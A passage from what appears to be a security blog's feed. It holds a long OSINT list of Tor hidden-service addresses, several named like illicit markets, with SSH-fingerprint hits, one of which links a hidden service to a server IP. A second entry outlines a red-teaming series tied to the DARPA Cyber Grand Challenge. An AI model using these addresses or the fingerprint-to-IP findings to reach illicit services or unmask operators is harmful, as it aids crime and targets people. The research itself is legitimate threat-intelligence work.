 yzqk4qzlzb7cmwvi.onion<br />
 fq7ushavwycmjcyr.onion<br />
 faubrtectjid43fm.onion<br />
 r3i7oithctjbh6ld.onion<br />
 ipju2pgwck2hdftn.onion<br />
 prozacaaiyekybud.onion<br />
 3kc76jpdifdrhh6v.onion<br />
 6edcdxdff2qej7b3.onion<br />
 pqoaanwpgki4vbk4.onion<br />
 ww4jckmyaxly3rez.onion<br />
 stolensamebkp5ny.onion<br />
 37mgehffdti74zjy.onion<br />
 hmrbvzldfgr3whhx.onion<br />
 7d5u6upbbltaztjx.onion<br />
 r2abcodpe7duscog.onion<br />
 vubymrnyzovh7tcq.onion<br />
 pinkju4c7akrnjcc.onion<br />
 3htfwd2shbx6vjzq.onion<br />
 x26vj5diaxxfidhs.onion<br />
 fr23pwx2bxhlurpz.onion<br />
 rf3xojfkckdumtvj.onion<br />
 q2sg67ft4cdvjlfv.onion<br />
 r7hm6ggazkt6iygm.onion<br />
 f7c37njfpuwn2v4x.onion<br />
 qsl4fyr6jg4s6iij.onion<br />
 22222277udochg2p.onion<br />
 zeldaxdc4bb64pjk.onion<br />
 s6lzbq2ad4x6jada.onion<br />
 5scqjk22p2ghdc3l.onion<br />
 eprlyo7dy4ipsemg.onion<br />
 nt4ozq4yi5q6lf6q.onion<br />
 362jdnvs4w5itsql.onion<br />
 vi5ydynhfco62g4v.onion<br />
 eeb6uwmgwwgxya3l.onion<br />
 yasaqlr7ptvr2k3q.onion<br />
 wo57yc5oiry6xukk.onion<br />
 npzg25inwtzdu2it.onion<br />
 ccjf6544uagdovyc.onion<br />
 i6x3fypfwbdwwbtn.onion<br />
 tqyd6pkbp4qo2ntj.onion<br />
 54pwkutdw3sneaxc.onion<br />
 b3osz2cvm42ssyyq.onion<br />
 7q6t6nafa4vraz5b.onion<br />
 y6kzmfomrkeyu7ew.onion<br />
 n36gazgnqrv5pxgs.onion<br />
 p5uploa5ecphuu26.onion<br />
 335yjxs5mggqqueu.onion<br />
 26dwh44f4nsab6fi.onion<br />
 ps5et5wytunk73ya.onion<br />
 ggoenh4wlsbzxpki.onion<br />
 z7sq4lbxc2qvr3ol.onion<br />
 2llh7jnrg5dluhuv.onion<br />
 j7ubhpxbgztujl7r.onion<br />
 svyagrufqojpw2ge.onion<br />
 6szhphzy47jtlnzj.onion<br />
 cbobpnh7k3rsvek7.onion<br />
 y2kv3eztz42da2c3.onion<br />
 alc3geathegs5qpb.onion<br />
 rezwkyjzzjd2tmmc.onion<br />
 xrsweuattx5iqaat.onion<br />
 qhdy5z6pa2hl4gn6.onion<br />
 52ofxowwd5yonjoy.onion<br />
 iofj2mgrcywhz63j.onion<br />
 unknownfytj5zq23.onion<br />
 e7ygisuxsn2qmjlu.onion<br />
 vjxrcebsxvrtvl4u.onion<br />
 ifkueryn4mbe4ir6.onion<br />
 vv4qzpowqci3pztt.onion<br />
 omvffz7sau56te2b.onion<br />
 4nn5heqdrlik4gln.onion<br />
 j6zh2uj5hjbgygqn.onion<br />
 3xgol277ivwetdgt.onion<br />
 yzo22f4p4xhaeikc.onion<br />
 mjzrsy2jrfhqbewa.onion<br />
 g24stauh3c3fkk4j.onion<br />
 3j2jxpl5mykcxub6.onion<br />
 tiplh623tm6ltzzv.onion<br />
 pjt5mkknunfl6ayn.onion<br />
 ab4nuabx5hq6rc4x.onion<br />
 e224alaztwmpp5y5.onion<br />
 stonedbwv7q7blkb.onion<br />
 moiq2zm4zuwlm2ae.onion<br />
 nimjytdjvjtfxdgm.onion<br />
 f2glmbrdyjuvuqnf.onion<br />
 burgvl2u7nk7fhdo.onion<br />
 6chj4w6n3344ksyp.onion<br />
 q43yxitokbmbgzvh.onion<br />
 cloudninetve7kme.onion<br />
 oiihmymafraogsoz.onion<br />
 q737udch6nbvb3ao.onion<br />
 bmwkqlas64bkputh.onion<br />
 brasilxi6ajnjqdg.onion<br />
 bsrygc3eqlxtvvpx.onion<br />
 sz53ldlmxyxmxdal.onion<br />
 222222s3ixamuq6h.onion<br />
 btc4u2dpqfqqfdpq.onion<br />
 2ynis3id7ubtpjop.onion<br />
 yv4i7yzpezwvu6v2.onion<br />
 3polsotgarff7lxx.onion<br />
 bhax6wneaan2jiij.onion<br />
 5mxp74ekvxefnkw7.onion<br />
 uth5ilecirm4sxug.onion<br />
 cprshop3hiwb27u5.onion<br />
 wwy7jgw3ke5vxqws.onion<br />
 kdo6te5fpazcd3zv.onion<br />
 pryatma63cdoscd6.onion<br />
 frc7ihlkarakfjzd.onion<br />
 mhtka2aq7nbib54f.onion<br />
 2ha5prrlkdzawe3c.onion<br />
 tn25reqz24bqqsx5.onion<br />
 hssq4amgkcr6qiv4.onion<br />
 nqqhvd75fsqadwl5.onion<br />
 5pc3igesiqc3m6z7.onion<br />
 pqbhsmwaxylm62r7.onion<br />
 ophelieqqdbgdmza.onion<br />
 lisv3z5lsasnz22g.onion<br />
 ifzo6iwumrecgqpc.onion<br />
 mxzzaiahatoiyxhb.onion<br />
 q5k25sw4sww2mf73.onion<br />
 bkkhcrnger25lspj.onion<br />
 6ck52sqgmxgqnzx2.onion<br />
 baad2lw67n32kbdn.onion<br />
 rstdoihvrw3ifw5z.onion<br />
 e5dq2dukn4pfl5k2.onion<br />
 zl2bev3hhc4e3hxx.onion<br />
 vx5fq53y7khhg2ge.onion<br />
 7cipfhqtvml25elz.onion<br />
 5mipfjcibucvp77t.onion<br />
 nmtxhylir27lxsxp.onion<br />
 galaxytlv3r5xkbt.onion<br />
 tqac6bwg3sc3hj6p.onion<br />
 tkusltv7n7sqi76l.onion<br />
 ij45s7xb62abfggu.onion<br />
 k5vshxaeqpelcwyb.onion<br />
 z4n2i2tmfj2agtui.onion<br />
 vkcvafzndqssm4og.onion<br />
 3r7ailix2glqhrwb.onion<br />
 umgd6i4p3mwyqgw6.onion<br />
 ph64ffljlvbrt64t.onion<br />
 jtkv3p7c5tyseswh.onion<br />
 huftp6j33qclzwmk.onion<br />
 sassb54zdzo474nt.onion<br />
 p7q6n5ri3dzsuq6u.onion<br />
 6nkzmvk66p3yfx2y.onion<br />
 fswcc6ncycsk7fdw.onion<br />
 sy4mgj343ywu5hch.onion<br />
 u43rlehjwe43h64b.onion<br />
 5svy3fulf7q35eij.onion<br />
 wd37qndlyg5exh4p.onion<br />
 nmftpz4fjqnbmoim.onion<br />
 zce4p7bavtstnwzt.onion<br />
 uhpjb5hawvjz462u.onion<br />
 o2fxtfdqvu576ij5.onion<br />
 4f5g5aruu727mo2n.onion<br />
 vssgunkmqcezisro.onion<br />
 darknetfusiuzat2.onion<br />
 x57cqsirjuhgxwvx.onion<br />
 hydraf53r77hxxft.onion<br />
 llvwfy2hc2fbawzb.onion<br />
 mubak2tbl45atna7.onion<br />
 dtudti7f6gzhwhky.onion<br />
 27ygtpv5svt2cizo.onion<br />
 cvosssyjagyzsb4d.onion<br />
 lubzpslfl3nnvqzn.onion<br />
 34knp4s6gxg7vfkm.onion<br />
 qdmyriupjgdvfsh7.onion<br />
 ap4aiw7wtwcaxe6m.onion<br />
 ozpm7oztkaejlvpr.onion<br />
 m2rn5v3lqo6cg47a.onion<br />
 omubolaipbpzwnfv.onion<br />
 3nbkx2i2ppyhjgnv.onion<br />
 du2zcsroyga6quf6.onion<br />
 nmugzkkluxukne75.onion<br />
 l33fzxktfy35xs63.onion<br />
 opjbdml5ribad7oi.onion<br />
 afon76in47gulb4l.onion<br />
 cin47auun32db3rr.onion<br />
 o6rdwrberksunrvg.onion<br />
 rnxug62u5gbwz4b2.onion<br />
 5xyq66kk6jio6kqi.onion<br />
 zsgyq6ndex3xceeo.onion<br />
 blyhm2xtcqlvmqp7.onion<br />
 tchivvcocg53w35f.onion<br />
 leuknw7jtr2fgu7e.onion<br />
 ibuo3npr3soz4uhw.onion<br />
 eiv42d26wdbrjwwe.onion<br />
 le5kp2b7pofcm4gd.onion<br />
 664o4q3dn5qc4ebt.onion<br />
 vi2capght3xueg3z.onion<br />
 46vnnzhzwdvfe774.onion<br />
 nttvtf6ji3fk7qvr.onion<br />
 fntreemiobli7mgo.onion<br />
 rlw7xf5m6t2y6tdx.onion<br />
 tnhhalr6lp7jlf4e.onion<br />
 g4r2pz2r22ztdcsm.onion<br />
 3z7rlgb6ec575un4.onion<br />
 mywuwj5f76usg7eo.onion<br />
 63ejyoos6damwgsj.onion<br />
 ivunxroa53aslijm.onion<br />
 qx2xyhtp6on7gtns.onion<br />
 btma5ir6njc4za5k.onion<br />
 ax6hpsyvohbobwwe.onion<br />
 oi3qxxgqnkkqgyne.onion<br />
 rbmtm2h4a2n5su2f.onion<br />
 2heq7votw4w7tpjt.onion<br />
 ler5arir5rsq5vcn.onion<br />
 wfcuqumh62ra2ard.onion<br />
 7mbi2vgmpdpdz7gc.onion<br />
 mu7iqupgas66aq7g.onion<br />
 uldq24cz2suispnt.onion<br />
 n2pd6wecwp3qjoxk.onion<br />
 oahmssjdnck7ntzx.onion<br />
 chennaouhnnozoob.onion<br />
 soe4janpjdzuvpiy.onion<br />
 ldvhz2y3h6kynhto.onion<br />
 vwez7s5tkdj7munj.onion<br />
 q7eb7ychylij3beq.onion<br />
 bnzfl6eg3dy54ax4.onion<br />
 cjrpkuxxubmq4wrf.onion<br />
 j5j5yof2okwr5dkb.onion<br />
 haj5vzsrpiouwsgj.onion<br />
 yhsfaf3vj2ztd522.onion<br />
 memewnkvkwru7mzc.onion<br />
 sasmbqgfqt2hok5n.onion<br />
 6khnf2ce7iaagljh.onion<br />
 uu3v5rmzasvrsb2g.onion<br />
 l7aqs6iomyixpfto.onion<br />
 qy6xj7xpb5ckythn.onion<br />
 gkgwhrau5yejzizo.onion<br />
 a56e4bg7lsm6kfjh.onion<br />
 d33pzjppzy7d37r2.onion<br />
 ejcenxioqi3lqy6k.onion<br />
 ghfwkbf7br3lcg7y.onion<br />
 khs5h6znb3xqnr2d.onion<br />
 2zhin7xk3tr4os5p.onion<br />
 lhve3n5uv4d3z23f.onion<br />
 tluxw6j6gj7lkuem.onion<br />
 se4y7yjswxdyqy6s.onion<br />
 hctppfblwfot6ces.onion<br />
 7jv2q5zyz4ij6yuf.onion<br />
 rszqv3fn4hivaotd.onion<br />
 arukniwn2x7cjk47.onion<br />
 w5vz5hbzf6bqbxsi.onion<br />
 ibnin7gikqdyq5hh.onion<br />
 fo3elq3zvk3e5l52.onion<br />
 jjek2rxz5upj6bsi.onion<br />
 zkgjxe7li5bobfvd.onion<br />
 g5oe45otuf65yzf6.onion<br />
 deea7qgsxnqlgxkg.onion<br />
 shnltmi7qxznz2uu.onion<br />
 zc6be3lhdohxf3uw.onion<br />
 53fmenm2glhjte7q.onion<br />
 botnetsgx2k56vly.onion<br />
 t6o6ht7jkbvptf7i.onion<br />
 kf47hlz25hvb5aob.onion<br />
 t4oxrwmm7j7qgo2o.onion<br />
 gnkltbsaeq35rejl.onion<br />
 5lzcjq6u64lngdff.onion<br />
 uksfvgmwpiww3n4s.onion<br />
 fubifardwbyvr2ol.onion<br />
 vpo3f5hjmmj2n2cg.onion<br />
 kkj7bhhsdxzi2n33.onion<br />
 glomiojyinf6h5h4.onion<br />
 logouvlhfh5u6dp6.onion<br />
 bvdwu4g4tucqobrp.onion<br />
 la5futldp7xjrpc4.onion<br />
 usbkillahwnsusld.onion<br />
 dwi53x4gche7zprc.onion<br />
 t334jtenffwphknr.onion<br />
 2u3vnu3j7nkdlzuw.onion<br />
 k2pbya4zcsmkilwx.onion<br />
 zfqsq77k44ydajqj.onion<br />
 5pgiubjw6e2hp7ro.onion<br />
 ypx7vg3xtemcfdlp.onion<br />
 b6v76oia6koavx53.onion<br />
 dkij4reelh34nwgu.onion<br />
 tpqr4vpyibch43dl.onion<br />
 zlzlg4hans65lrf4.onion<br />
 22225hcr6kh64ka4.onion<br />
 sfqpfv4b2ly62rah.onion<br />
 jllbaq37upxklgvt.onion<br />
 aswvjhcvcqvbk2l5.onion<br />
 nsozknawhnhwnpod.onion<br />
 vwqofuoiuxl6sp7q.onion<br />
 pgdnvi6nf26gbzgf.onion<br />
 ad3wd3npbamzr5t5.onion<br />
 x6ow5ccafb7bnufx.onion<br />
 uzpnqrulcv63t7rt.onion<br />
 bv2c3p4rpmjjgwzm.onion<br />
 kfx644xkzwovox6t.onion<br />
 7stieerozqdahz4o.onion<br />
 iqlnpfvb36bqjjpc.onion<br />
 wpgeoiz53fnld44b.onion<br />
 ctny7rdyl2vfaf66.onion<br />
 sroad36v7x3k45bl.onion<br />
 wmnrgcpmwouai4xd.onion<br />
 2x6rzvgatbcev7cy.onion<br />
 otwg5iksgofdshpy.onion<br />
 qdackatwmkcmpbfp.onion<br />
 trn53kchmnc2tgzp.onion<br />
 7bj6mdndskxndxli.onion<br />
 chvfnbcqkuyx4tip.onion<br />
 o6i2ga24awhavmcm.onion<br />
 fullchan4jtta4sx.onion<br />
 hio325vf2qqmdwrx.onion<br />
 bfdgvsatxh2ure7j.onion<br />
 nux3rn45vfj2yoes.onion<br />
 g7mfis7kgy52jfdo.onion<br />
 issssswqhrqx5cat.onion<br />
 zedelc26vlmqtlcw.onion<br />
 22oxht5ep3hvyboc.onion<br />
 5bbxmqquxbc25dhk.onion<br />
 7p4phtqnrzrg5ju5.onion<br />
 ngmqzzg6aesmflq5.onion<br />
 pbi444ahcrohu44z.onion<br />
 p2nje6eqyxs73bev.onion<br />
 vtkihaa455umjowh.onion<br />
 nix7yjeclhyux6aq.onion<br />
 6loxxk6hwfkjpz6b.onion<br />
 upnsewklsh77e4rs.onion<br />
 6i3athikp6hsre2m.onion<br />
 qkqfsr3cpbr5emel.onion<br />
 kstaplh572a5g3a2.onion<br />
 dtkeubgx47jeqvag.onion<br />
 wk3ini5gexnpkwm3.onion<br />
 pda4geq7wbiuive2.onion<br />
 7q6fl6bh3njeevsj.onion<br />
 q2muuyhexvsksylf.onion<br />
 5eekodmwl2vjhehw.onion<br />
 mk3zwxwllva7u6bj.onion<br />
 v4y7wyoua2jwdf43.onion<br />
 pbchatkoollgzmbf.onion<br />
 xz2bhyw5g7tnlx5r.onion<br />
 www.2festxvscdtx6fzm.onion<br />
 yetsm5p47bdj55ic.onion<br />
 ml7nua5sel6v5pwo.onion<br />
 cxiz4ysttf3jpnyc.onion<br />
 5dyndfpqx7tfdivw.onion<br />
 me2jc562s3jyp7vc.onion<br />
 euouafk3dz5h57lw.onion<br />
 kaosp6nojakjyufg.onion<br />
 tt4qipvygdficknx.onion<br />
 56wogxohdfbnccig.onion<br />
 x6ls6ot4ykheqbfg.onion<br />
 dp5whclglot46k53.onion<br />
 bfvfq7hjcdoinzo4.onion<br />
 vxecxultcic6mb3u.onion<br />
 oyjxkkf5t5og2y5t.onion<br />
 5jorhiboibamwpor.onion<br />
 nr25kb2m2jurpd5e.onion<br />
 ougu5suvv7sekt7w.onion<br />
 xxxfpi5bslnjdakw.onion<br />
 zptza3nscq7geppw.onion<br />
 ib4epxlclfqwxd44.onion<br />
 luubotvjtlol6cvs.onion<br />
 m25mwsd7phtu7cpb.onion<br />
 em3uscfj5pl2cgrl.onion<br />
 wmnfdatbmfe2fjvk.onion<br />
 x3o4qqb7colw5uuo.onion<br />
 6timsegpome2vgse.onion<br />
 lc6utkquc3rjly7q.onion<br />
 mysxmfs2rlbawnsy.onion<br />
 yvhioa4dqe3uys63.onion<br />
 n3c5n2h7454t5w5u.onion<br />
 er34q2ds7jfc67q5.onion<br />
 adkjpsmg74jexhnk.onion<br />
 au4rxdo57jdnzbtq.onion<br />
 cleaner6aflzxnio.onion<br />
 oz34skvzboobohuc.onion<br />
 xcoins56iszumbwa.onion<br />
 hk6tq6girzlgg2at.onion<br />
 bo4lbe6xavxbntrv.onion<br />
 7ygrfzxxtjkwi2gy.onion<br />
 l4sg5plb7n5bvi5b.onion<br />
 w2skfegthbywoqqq.onion<br />
 2v5duuedjkkt4ac6.onion<br />
 lnzeflhvr46vvc76.onion<br />
 dwli233pdlvqexvb.onion<br />
 4limjlssg7qdaweh.onion<br />
 bwp5s74ca4xv65a4.onion<br />
 o4dtb6wvvjo4kxuf.onion<br />
 zktdmmefjjlk7s73.onion<br />
 ofvibtptm3c3vxxw.onion<br />
 rabbit6k3ummqq7j.onion<br />
 36vfxxwg24sk2pj7.onion<br />
 e4c4xzz3hl772fti.onion<br />
 5utl62q3jmc6cvcq.onion<br />
 ydxw7wo63ob3muje.onion<br />
 qv3jppdnqshy3wh5.onion<br />
 n7a5rsk7ktf4xc5s.onion<br />
 vnfq4jy2hkqvh65k.onion<br />
 3dnrb7a7pibooe5h.onion<br />
 3jx5qykgtclajllf.onion<br />
 klh4x5yrjzisfvv7.onion<br />
 6rc7ohky27smj637.onion<br />
 fbr3urtao5c4zecb.onion<br />
 u3rrfra7p2jryl7y.onion<br />
 5vekryl2u5rrxqli.onion<br />
 3jkidlnynuqaz6mi.onion<br />
 qinarqlcug62y5mm.onion<br />
 bbjoy7qoo5hhqpdc.onion<br />
 kxj255o2nmv4kaao.onion<br />
 olfa3wj3btmn7ipp.onion<br />
 sx7qldnylnmaszzk.onion<br />
 escrowt64zp4vb4f.onion<br />
 7i2c7jvhs7hxo4dm.onion<br />
 qbj5eznyjs5q7rok.onion<br />
 222222chifbusg6m.onion<br />
 eegjsxrld7ilm72n.onion<br />
 wsll5inogfo7aozj.onion<br />
 ojszjj56eml4wohh.onion<br />
 76xxdyqycmwirtot.onion<br />
 7ygiiyjkqzu62k4s.onion<br />
 7iotvmzd35c4d2eu.onion<br />
 3eucl7djy3aiwiu3.onion<br />
 y64a7tq5gky4mtax.onion<br />
 4okv6jdxc7hkyipy.onion<br />
 jhrgteayoe2flf7w.onion<br />
 xqxf2ggcud2kntck.onion<br />
 vbq4dlwd36ysyded.onion<br />
 5y7cmg2ambx7yj6k.onion<br />
 j2zimqztxub3eoze.onion<br />
 4cyue7ofeaonq6qk.onion<br />
 urxixyk3bz6mnozu.onion<br />
 j4yvbpokab2qzmq7.onion<br />
 kwlxvnmxiu2vfvcy.onion<br />
 fw7bgpv6ya6bwg3u.onion<br />
 zpzby2nphgkbaphu.onion<br />
 cgcin4hzzvtcaf5d.onion<br />
 vrhilei2l7slihwu.onion<br />
 ij7hdpzoponrdy7d.onion<br />
 otmbrbthhqhlmzee.onion<br />
 5lyv7skqzxddmxew.onion<br />
 kgcfwmjmft5nfklq.onion<br />
 s4ajmaxbezbwbpfy.onion<br />
 h24knzai4v2jbh3v.onion<br />
 sh6ixoc3ifpyjivs.onion<br />
 7kuslhhtlooylgu4.onion<br />
 te2ffmtxqmi26s4y.onion<br />
 xdlvcny7ssseirnt.onion<br />
 22ozauzmrn3zxkog.onion<br />
 huobnhpxqi7bidgo.onion<br />
 uws6btjfqevkttti.onion<br />
 nrblbgdw2lidgqv4.onion<br />
 pdizimmrq5mwjkun.onion<br />
 dailieskavij4w4d.onion<br />
 vds6nt7o53aloful.onion<br />
 xfiles4wgbru6qzm.onion<br />
 x2u26l2gxxxkrbrz.onion<br />
 zhgu7ehjsho2djr3.onion<br />
 h54f62bv67tjqylh.onion<br />
 jjo3ugrqubdzhc4u.onion<br />
 zwnvycqmjlvjiwb7.onion<br />
 chanceaxm2eaygkx.onion<br />
 wlqemeooh2epuo2d.onion<br />
 qcvrhiygasiwhgnz.onion<br />
 lpol4nsydodbvxfg.onion<br />
 buygiftr2vyh5fyz.onion<br />
 z4qvb5q3uvjy7szo.onion<br />
 oz3vngabfrasvf3i.onion<br />
 j6hfohy5j6tfyum3.onion<br />
 xdphqqw2nltz2h62.onion<br />
 wkr53ijwmsnb4pd3.onion<br />
 5v6psw5oqdurbpaq.onion<br />
 7qxqu4zwdjxh33kr.onion<br />
 toxdirskqkvuogte.onion<br />
 g7k47ywgchde5hmh.onion<br />
 ktqdc6zoh22aqt5i.onion<br />
 kvgrjfzvjbhnguoe.onion<br />
 yipeptidsl75eri7.onion<br />
 li4yevjwa2gupx7e.onion<br />
 viiydc32kojn6rdu.onion<br />
 73aiozxu75vfrkl5.onion<br />
 5c4cpdy2hjmfzgaq.onion<br />
 zti56emoqbwtiu2y.onion<br />
 32qms7q5widd7wke.onion<br />
 mff2ch6ghedn4rdn.onion<br />
 75kcsobl45hwnfcj.onion<br />
 v76n5o37d4ulmwcd.onion<br />
 pnlld76twbkskpai.onion<br />
 lm4raaqq2jqwxyep.onion<br />
 wogolc765mdmky7z.onion<br />
 2p4cnrv7xdnltfs7.onion<br />
 5lfwdubl6vxdphrz.onion<br />
 s2o757cbk5xw4pad.onion<br />
 2fks7x7peopiki2p.onion<br />
 u7cmbgpy6uc4jasj.onion<br />
 idrh6ld5t6iq367y.onion<br />
 vetmqi65zjxra7dr.onion<br />
 nkna77c37nculpeh.onion<br />
 ethy5nms26vmoean.onion<br />
 nc6zafx6yndacb5w.onion<br />
 qnd55jlr6kuc45v5.onion<br />
 akpvgkxxzltnp3ac.onion<br />
 2oi3zajmuxc5udde.onion<br />
 zkqfsbhaahypjnpl.onion<br />
 czqpicz6inffwyqy.onion<br />
 aim7jnedzsbo7xar.onion<br />
 nic5w3xajwj23jow.onion<br />
 logisticoakprn3v.onion<br />
 ljsyrhifuogxjnej.onion<br />
 djq6sqzi2a5u3bpb.onion<br />
 kznnvlhqxoisnhva.onion<br />
 7bv363zon733tcww.onion<br />
 i36qttkatqk7rkh7.onion<br />
 txzjba2faqgrqcjw.onion<br />
 www.xfiles4wgbru6qzm.onion<br />
 psky7hjh2ibuqljz.onion<br />
 zpnzkyrgzdfdzwh3.onion<br />
 ve7xf53cgbmqd4kp.onion<br />
 eljst6meu3fojeju.onion<br />
 fp2n5shnr6wuso4p.onion<br />
 iwxicbrknwnl4qyl.onion<br />
 s2fbitwk52wwnuun.onion<br />
 k34gy5sb7krdtgf4.onion<br />
 222222einb2dtou3.onion<br />
 yhjdshgaxmacrkup.onion<br />
 3jr6qgn7o777bcdb.onion<br />
 7p5svdslcdj2cgjp.onion<br />
 olkqmczlefzknh2u.onion<br />
 nwo2o4laplucctsv.onion<br />
 qy456aomitoe2jfs.onion<br />
 hbmfs2c3muh76zvq.onion<br />
 userl7qp24jlajyx.onion<br />
 dsdla3f3r3srz5kz.onion<br />
 hacker47nad4udho.onion<br />
 r54gv66rfaizzq2z.onion<br />
 aaz4bexuanmn7sbv.onion<br />
 wxygz6umsooizm6w.onion<br />
 billsv3ungv6s4st.onion<br />
 zc5nnrzfknaxbep6.onion<br />
 fel3kmf57niot2zl.onion<br />
 whsoo2gch6okqxry.onion<br />
 suldgzbelmssxys6.onion<br />
 vu42rm4z2qk6iljd.onion<br />
 2xsbcqev6evmgglo.onion<br />
 7zjlxleoekywde3j.onion<br />
 h5qpy3b3nhpqc2ec.onion<br />
 33be4hwfxkqauevb.onion<br />
 i2fezkv2mmcw2n44.onion<br />
 dxsvp63wu55yg6rk.onion<br />
 6fnwtifw6zxa6bpl.onion<br />
 3swfcoquajg3t2kb.onion<br />
 222222utze5numag.onion<br />
 l4jkbxcjkuuth4dp.onion<br />
 v7rzswf5prrd26fd.onion<br />
 qkpheylgqdoubuiz.onion<br />
 pmpxmhmaxkua3q6g.onion<br />
 6tkjalftqbs3n4li.onion<br />
 k4sy5rzxqzjfm7wk.onion<br />
 oddsasmtc5gglatg.onion<br />
 7l2xvzmbdmrx4mjl.onion<br />
 kixd72fg25qpbydi.onion<br />
 p4bkdy26pbsxhsft.onion<br />
 3fym7qpu7jsljat7.onion<br />
 nm2vm4pjwoxlt5vh.onion<br />
 anf625gv57a2unas.onion<br />
 njdl3afan66gdlr5.onion<br />
 gsg76olii5zcykdx.onion<br />
 vakffnzkmrezupxr.onion<br />
 gunsdarkhzyowteb.onion<br />
 zcrxjlhuxpjrxsh2.onion<br />
 py7dv5yovdeyx6qk.onion<br />
 5roc7pfyg2kvret6.onion<br />
 zyxououig4nz7n4t.onion<br />
 tr56eje26k7go6dc.onion<br />
 2agobs57djngatwc.onion<br />
 xe6vzgwxpaygtrz4.onion<br />
 ocv7uecnlu45ct2k.onion<br />
 e6prmcgdylloe36h.onion<br />
 u7gzqyw6jd5avej3.onion<br />
 3wm73nwhdwaimmwc.onion<br />
 piratexx3kbieklb.onion<br />
 x6rebznvztdsqx5m.onion<br />
 zg5eq7emxgm2wjj6.onion<br />
 uudhz333oblcbsru.onion<br />
 enmufcqu5x7bbp3f.onion<br />
 zbin5zvi5aziqgzj.onion<br />
 6fx3g2bsrw3swpoq.onion<br />
 6qoiqi6iu6zgpr3p.onion<br />
 urj4lxvqty5x4eyf.onion<br />
 oqc2m77eiwp3sbkp.onion<br />
 yrir4ndmytf45zwg.onion<br />
 6jbb5gtzhojngoqr.onion<br />
 6h47ah4ytetf4gc4.onion<br />
 2gf6inwn32pov6ro.onion<br />
 v2q73k54fvnhtouv.onion<br />
 krm4jovc74jfrakb.onion<br />
 eolowe7qae5qmbmt.onion<br />
 nqkickoaktyyhfly.onion<br />
 3q7zdknyvctlp5qp.onion<br />
 ff5kcsqcpj6lm2vr.onion<br />
 lo6x4uzxr3qif2jd.onion<br />
 65c2z4uwyz5wwhe2.onion<br />
 t2mufpcr4pnkww7p.onion<br />
 apbv6itrkcr7k3ny.onion<br />
 fsxeh2tzrcby266e.onion<br />
 3eibyny25i6xpn6u.onion<br />
 vp4xo3aqqtsuvacl.onion<br />
 z52gehhxezdzt3dq.onion<br />
 hmr2f67emlwxaewv.onion<br />
 nxmsum76qu7zpswk.onion<br />
 ubsjg6e5ub3zh6m2.onion<br />
 tuutgu6huadsxihw.onion<br />
 angmd6uyaig26c5q.onion<br />
 tcwoifl3hwliq4i3.onion<br />
[!] SSH Key 88:9b:b1:7b:48:ed:a3:78:06:83:fb:02:96:5d:b0:1b is used on
multiple hidden services.<br />
 rijz4vgcxatzeve3.onion<br />
 cqbexnyrbfllryae.onion<br />
[!] SSH Key 7f:2e:20:87:ff:47:c0:84:5f:26:20:3c:14:c5:ef:a9 is used on
multiple hidden services.<br />
 occuomegawqtkl6j.onion<br />
 ct7js2ioccuomega.onion<br />
[!] Hit for 02:0a:17:89:76:1c:ef:70:52:74:01:e6:78:90:9b:b4 on
46.101.179.223 for hidden services ksiphp3uhyv5fqhn.onion<br />
[!] SSH Key 9d:a2:37:9c:ea:66:ac:25:f3:19:ac:c4:7c:aa:b7:97 is used on
multiple hidden services.<br />
 vola7ileiax4ueow.onion<br />
 git.vola7ileiax4ueow.onion<br />
”</p>
</blockquote>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Dark Web"/>
    <category term="OSINT"/>
    <category term="Cybersecurity"/>
    <category term="Defcon"/>
    <category term="BsidesLV"/>
    <category term="Black Hat"/>
    <category term="Metadata Analysis"/>
    <category term="SSH Fingerprinting"/>
    <category term="Threat Intelligence"/>
    <category term="Adversary Modeling"/>
    <category term="Diamond Model"/>
    <category term="Network Forensics"/>
    <category term="Tor Hidden Services"/>
    <summary type="html"><![CDATA[During Black Hat, BsidesLV, and Defcon, I ended up having a chat with Justin Seitz about his nifty OSINT automation. I decided to take his data sets and enrich]]></summary>
  </entry>
  <entry>
    <title type="html">DARPA Cyber Grand Challenge era coming to a close</title>
    <link href="https://www.securesql.info/2016/08/15/darpa-cyber-challenge-ending/" rel="alternate" type="text/html" title="DARPA Cyber Grand Challenge era coming to a close"/>
    <published>2016-08-15T00:00:00-07:00</published>
    <updated>2016-08-15T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2016/08/15/darpa-cyber-challenge-ending</id>
    <content type="html" xml:base="https://www.securesql.info/2016/08/15/darpa-cyber-challenge-ending/"><![CDATA[<p>This Thursday, seven research institutions will compete against each other.
Unlike other typical hacker challenges, their automations will compete on
their behalf.  The winning team will take home $2,000,000.00.  The automated
programs will crack, patch, and defend applications / networks.  I will be
there with my teammates as our program cracks and hacks.  You should come on
by and cheer us on.  The live feed may be found @
<a href="https://www.cybergrandchallenge.com/">https://www.cybergrandchallenge.com/</a></p>

<h2 id="3-years-in-the-making"><em><strong>3 years in the making</strong></em></h2>

<p>It has been an exciting three years.  So exciting that I have been writing
blog posts about it during the progression of the team and competition.  After
Friday, I am allowed to publish this series.</p>

<p><em>**  The Team and Competition**</em></p>

<p>It has been an interesting competition with my global peers.  While others are
savants with regards to patching; my education, experience, and skill set
lends itself naturally to software program cracking at big data scale and
defending cloud networks with no human intervention in a minor capacity.  We
plan to prove the world Skynet is nearly upon us.  However, when we all came
together, we had a negative outlook we had to turn around: the techniques and
automation required is subtle enough that it is not clear if the programs will
be able to attack and defend at scale.</p>

<p><em><strong>The series will cover the following red team at scale subject matters and
philosophies</strong></em></p>

<p>Red Teaming Intro</p>

<p>•   CAPEC</p>

<p>•   Risk glasses and bias</p>

<p>•   Possibilities and space</p>

<p>•   Irrational and rational behaviors</p>

<p>•   Strategies</p>

<p>•   Mitigation and / or acceptance</p>

<p>•   Conflict avoidance</p>

<p>•   Continuity</p>

<p>•   Game theory and interactions</p>

<p>•   PTES and NIST 800-115</p>

<p>•   To adapt or not?</p>

<p>Scope</p>

<p>•   Purpose, scope, hypothesis, and excellence criteria</p>

<p>•   Design</p>

<p>•   Execution</p>

<p>•   Monitoring and real-time analysis</p>

<p>•   Post</p>

<p>•   Documentation</p>

<p>•   Feedback loop</p>

<p>Legal Ethics and Layer 8</p>

<p>•   Business cases</p>

<p>•   Accountability</p>

<p>•   Budget estimation</p>

<p>The way to at scale red teaming</p>

<p>•   System thinking</p>

<p>•   Highly scalable systems’ and architecture designs pros / cons</p>

<p>•   CAP theorem</p>

<p>•   Orchestration and Workflows</p>

<p>•   Purple simulations</p>

<p>•   Reflections</p>

<p>•   Measuring intelligence</p>

<p>Mandatory Answers</p>

<p>•   End results in what context and time?</p>

<p>•   The big picture value-add?</p>

<p>•   Which methods apply to achieve excellence?</p>

